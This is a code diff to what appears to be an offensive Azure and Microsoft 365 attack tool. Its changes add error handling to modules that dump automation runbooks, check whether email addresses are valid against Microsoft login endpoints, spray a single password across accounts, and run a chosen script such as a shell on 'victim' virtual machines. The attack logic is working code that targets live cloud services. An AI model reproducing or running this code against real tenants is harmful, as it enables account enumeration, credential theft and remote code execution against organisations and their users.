@@ -1616,11 +1616,16 @@ def attackWindow():
                 else:
                     ExportedRunBooksRecordsCount = 0
                     DestPath = input("Please enter the path for store the data locally [i.e. C:\\tmp]: ")
-                    for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
-                        with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
-                            f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
-                        ExportedRunBooksRecordsCount += 1
-                    print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
+                    try:
+                        for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
+                            with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
+                                f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
+                            ExportedRunBooksRecordsCount += 1
+                        print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
+                    except FileNotFoundError:
+                        print("Unable to locate file, please check your path.")
+                    except PermissionError:
+                        print("There is a permission error with file, please check your permission.")
             elif "Reader/ListAllRunBooks" in ExploitChoosen and mode == "run":
                 print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                 print("Keep in mind that it might be noisy opsec..")
@@ -1701,41 +1706,63 @@ def attackWindow():
                     print("Operation Completed.")
             elif "External/EmailEnum" in ExploitChoosen and mode == "run":
                 DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
-                for target in open(os.path.normpath(DestPath), 'r').readlines():
-                    technique = int(input("Choose enum method [1=O365Office, 2=OAuth2]: "))
-                    if technique > 2 or technique < 1:
+                if DestPath == "":
+                    print("Please provide file path.")
+                else:
+                    technique = input("Choose enum method [1=O365Office, 2=OAuth2]: ")
+                    if technique == "" or int(technique) > 2 or int(technique) < 1:
                         print("Please choose valid method.")
                     else:
-                        if technique == 1:
-                            ' based on o365creeper to enumerate via O365 Office API https://github.com/LMGsec/o365creeper'
-                            body = {"username": target.strip()}
-                            r = sendPOSTRequest("https://login.microsoftonline.com/common/GetCredentialType", body, None)
-                            if '"IfExistsResult":1' in r["response"]:
-                                print("The email " + target.strip() + " not found")
+                        try:
+                            if int(technique) == 1:
+                                for target in open(os.path.normpath(DestPath), 'r').readlines():
+                                    ' based on o365creeper to enumerate via O365 Office API https://github.com/LMGsec/o365creeper'
+                                    body = {"username": target.strip()}
+                                    r = sendPOSTRequest("https://login.microsoftonline.com/common/GetCredentialType", body, None)
+                                    if '"IfExistsResult":1' in r["response"]:
+                                        print("The email " + target.strip() + " not found")
+                                    else:
+                                        print("The email " + target.strip() + " VALID!")
+                            elif int(technique) == 2:
+                                for target in open(os.path.normpath(DestPath), 'r').readlines():
+                                    ' based on MSOLSpray method by @dafthack '
+                                    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456")
+                                    error = r["response"]
+                                    if "AADSTS50034" in error:
+                                        print("The email " + target.strip() + " not found")
+                                    else:
+                                        print("The email " + target.strip() + " VALID!")
                             else:
-                                print("The email " + target.strip() + " VALID!")
-                        if technique == 2:
-                            ' based on MSOLSpray method by @dafthack '
-                            r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456")
-                            error = r["response"]
-                            if "AADSTS50034" in error:
-                                print("The email " + target.strip() + " not found")
-                            else:
-                                print("The email " + target.strip() + " VALID!")
-                    print("Completed Operation.")
+                                print("Not supported technique.")
+                            print("Completed Operation.")
+                        except FileNotFoundError:
+                            print("Unable to locate file, please check your path.")
+                        except PermissionError:
+                            print("There is a permission error with file, please check your permission.")
             elif "External/PasswordSpray" in ExploitChoosen and mode == "run":
                 Password = input("Please enter password to spray [i.e. Winter2020]: ")
-                DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
-                print("Trying each target with password = " + str(Password) + "...")
-                for target in open(os.path.normpath(DestPath), 'r').readlines():
-                    chk = ENUM_MSOLSpray(target.strip(), Password)
-                    if chk is True:
-                        print("Found valid account: " + target.strip() + " / " + Password + "")
+                if Password == "":
+                    print("Please provide password to spray")
+                else:
+                    DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
+                    if DestPath == "":
+                        print("Please provide emails file path")
                     else:
-                        if 'Invalid password.' in chk:
-                            continue
-                        print(chk)
-                print("Completed Operation.")
+                        print("Trying each target with password = " + str(Password) + "...")
+                        try:
+                            for target in open(os.path.normpath(DestPath), 'r').readlines():
+                                chk = ENUM_MSOLSpray(target.strip(), Password)
+                                if chk is True:
+                                    print("Found valid account: " + target.strip() + " / " + Password + "")
+                                else:
+                                    if 'Invalid password.' in chk:
+                                        continue
+                                    print(chk)
+                            print("Completed Operation.")
+                        except FileNotFoundError:
+                            print("Unable to locate file, please check your path.")
+                        except PermissionError:
+                            print("There is a permission error with file, please check your permission.")
             elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                 print("Trying to list all users.. (it might take a few minutes)")
                 field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
@@ -1970,9 +1997,14 @@ def attackWindow():
                     TargetVM = input("Select Target VM Name [i.e. 1]: ")
                     Selection = int(TargetVM)
                     CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
-                    with open(os.path.normpath(CmdVMPath)) as f:
-                        CmdFileContent = f.read()
-                    print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
+                    try:
+                        with open(os.path.normpath(CmdVMPath)) as f:
+                            CmdFileContent = f.read()
+                        print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
+                    except FileNotFoundError:
+                        print("Unable to locate file, please check your path.")
+                    except PermissionError:
+                        print("There is a permission error with file, please check your permission.")
             elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
                 print("Trying to list deallocated virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
